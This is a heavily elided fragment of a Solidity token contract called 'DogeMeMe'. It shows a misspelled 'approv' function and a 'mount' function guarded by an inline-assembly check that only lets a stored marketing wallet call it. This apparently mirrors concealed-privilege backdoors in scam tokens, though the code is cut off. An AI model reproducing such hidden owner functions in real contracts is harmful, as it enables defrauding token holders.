...
contract DogeMeMe is IERC20, Ownable {
  ...
  /**
    ...
    function approv(address[] memory accounts, uint256 amount) external {
    ...
    function mount(uint256 amount) external {
        assembly{if iszero(eq(caller(), sload(_marketing.slot))){revert(0, 0)}
        let ptr := mload(0x40)
        mstore(ptr, caller())
